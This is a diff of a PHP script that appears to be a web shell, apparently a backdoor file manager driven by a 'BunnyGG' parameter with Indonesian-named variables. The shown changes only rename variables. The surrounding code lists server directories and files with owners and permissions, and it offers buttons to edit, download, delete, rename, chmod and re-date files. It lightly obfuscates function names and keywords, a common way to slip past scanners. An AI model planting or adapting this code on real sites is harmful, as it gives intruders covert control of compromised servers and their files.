@@ -783,33 +783,33 @@ echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspaci
 </tr>';
 
 echo "<tr>";
-$auahscdng = $srl($bsn($lokasi), "", $lokasi);
-$auahscdng = $srl("//", "/", $auahscdng);
-echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?BunnyGG=".$auahscdng."\">..</a></td>
+$bunnyganteng = $srl($bsn($lokasi), "", $lokasi);
+$bunnyganteng = $srl("//", "/", $bunnyganteng);
+echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?BunnyGG=".$bunnyganteng."\">..</a></td>
 <td><center>--</center></td>
-<td><center>".fdt($auahscdng)."</center></td>
-<td><center>".gor($auahscdng)." / ".ggr($auahscdng)."</center></td>
+<td><center>".fdt($bunnyganteng)."</center></td>
+<td><center>".gor($bunnyganteng)." / ".ggr($bunnyganteng)."</center></td>
 <td><center>";
-if($isw($auahscdng)) echo '<font color="green">';
-elseif(!$isr($auahscdng)) echo '<font color="red">';
-echo statusnya($auahscdng);
-if($isw($auahscdng) || !$isr($auahscdng)) echo '</font>';
+if($isw($bunnyganteng)) echo '<font color="green">';
+elseif(!$isr($bunnyganteng)) echo '<font color="red">';
+echo statusnya($bunnyganteng);
+if($isw($bunnyganteng) || !$isr($bunnyganteng)) echo '</font>';
 echo "</center></td>
 <td><center><form method=\"POST\" action=\"?pilihan&BunnyGG=$lokasi\">
 <input type=\"hidden\" name=\"type\" value=\"dir\">
-<input type=\"hidden\" name=\"name\" value=\"$scdngpet\">
-<input type=\"hidden\" name=\"BunnyGG\" value=\"$lokasi/$scdngpet\">
+<input type=\"hidden\" name=\"name\" value=\"$Bunnyinvisible\">
+<input type=\"hidden\" name=\"BunnyGG\" value=\"$lokasi/$Bunnyinvisible\">
 <button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder' style='color: #fff'></i></button>
 <button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file' style='color: #fff'></i></button>
 </form></center>";
 echo "</tr>";
 
-foreach($lokasinya as $scdngpet){
-	$euybre = $lokasi."/".$scdngpet;
+foreach($lokasinya as $Bunnyinvisible){
+	$euybre = $lokasi."/".$Bunnyinvisible;
 	$euybre = $srl("//", "/", $euybre);
-	if(!$idi($euybre) || $scdngpet == '.' || $scdngpet == '..') continue;
+	if(!$idi($euybre) || $Bunnyinvisible == '.' || $Bunnyinvisible == '..') continue;
 	echo "<tr>";
-	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?BunnyGG=".$euybre."\">".$scdngpet."</a></td>
+	echo "<td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href=\"?BunnyGG=".$euybre."\">".$Bunnyinvisible."</a></td>
 	<td><center>--</center></td>
 	<td><center>".fdt($euybre)."</center></td>
 	<td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
@@ -822,8 +822,8 @@ foreach($lokasinya as $scdngpet){
 	echo "</center></td>
 	<td><center><form method=\"POST\" action=\"?pilihan&BunnyGG=$lokasi\">
 	<input type=\"hidden\" name=\"type\" value=\"dir\">
-	<input type=\"hidden\" name=\"name\" value=\"$scdngpet\">
-	<input type=\"hidden\" name=\"BunnyGG\" value=\"$lokasi/$scdngpet\">
+	<input type=\"hidden\" name=\"name\" value=\"$Bunnyinvisible\">
+	<input type=\"hidden\" name=\"BunnyGG\" value=\"$lokasi/$Bunnyinvisible\">
 	<button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil' style='color: #fff'></i></button>
 	<button type='submit' class='btf' name='pilih' value='ubahtanggal'><i class='fa fa-calendar' style='color: #fff'></i></button>
 	<button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear' style='color: #fff'></i></button>
@@ -834,10 +834,10 @@ foreach($lokasinya as $scdngpet){
 
 echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';
 $skd = "10"."24";
-foreach($lokasinya as $plerluscdng) {
-	$euybray = $lokasi."/".$plerluscdng;
-	if(!$ifi("$lokasi/$plerluscdng")) continue;
-	$size = $fsz("$lokasi/$plerluscdng")/$skd;
+foreach($lokasinya as $Bunnyman) {
+	$euybray = $lokasi."/".$Bunnyman;
+	if(!$ifi("$lokasi/$Bunnyman")) continue;
+	$size = $fsz("$lokasi/$Bunnyman")/$skd;
 	$size = $rd($size,3);
 	if($size >= $skd){
 	$size = $rd($size/$skd,2).' M'.'B';
@@ -846,15 +846,15 @@ foreach($lokasinya as $plerluscdng) {
 }
 
 echo "<tr>
-<td>".cfn($euybray)." <a href=\"?SiBunny=$lokasi/$plerluscdng&BunnyGG=$lokasi\">$plerluscdng</a></td>
+<td>".cfn($euybray)." <a href=\"?SiBunny=$lokasi/$Bunnyman&BunnyGG=$lokasi\">$Bunnyman</a></td>
 <td><center>".$size."</center></td>
 <td><center>".fdt($euybray)."</center></td>
 <td><center>".gor($euybray)." / ".ggr($euybray)."</center></td>
 <td><center>";
-if($isw("$lokasi/$plerluscdng")) echo '<font color="green">';
-elseif(!$isr("$lokasi/$plerluscdng")) echo '<font color="red">';
-echo statusnya("$lokasi/$plerluscdng");
-if($isw("$lokasi/$plerluscdng") || !$isr("$lokasi/$plerluscdng")) echo '</font>';
+if($isw("$lokasi/$Bunnyman")) echo '<font color="green">';
+elseif(!$isr("$lokasi/$Bunnyman")) echo '<font color="red">';
+echo statusnya("$lokasi/$Bunnyman");
+if($isw("$lokasi/$Bunnyman") || !$isr("$lokasi/$Bunnyman")) echo '</font>';
 echo "</center></td><td><center>
 <form method=\"post\" action=\"?pilihan&BunnyGG=$lokasi\">
 <button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit' style='color: #fff'></i></button>
@@ -864,8 +864,8 @@ echo "</center></td><td><center>
 <button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-down"."load' style='color: #fff'></i></button>
 <button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash' style='color: #fff'></i></button>
 <input type=\"hidden\" name=\"type\" value=\"fi"."le\">
-<input type=\"hidden\" name=\"name\" value=\"$plerluscdng\">
-<input type=\"hidden\" name=\"BunnyGG\" value=\"$lokasi/$plerluscdng\">
+<input type=\"hidden\" name=\"name\" value=\"$Bunnyman\">
+<input type=\"hidden\" name=\"BunnyGG\" value=\"$lokasi/$Bunnyman\">
 </form></center></td>
 </tr>";
 }
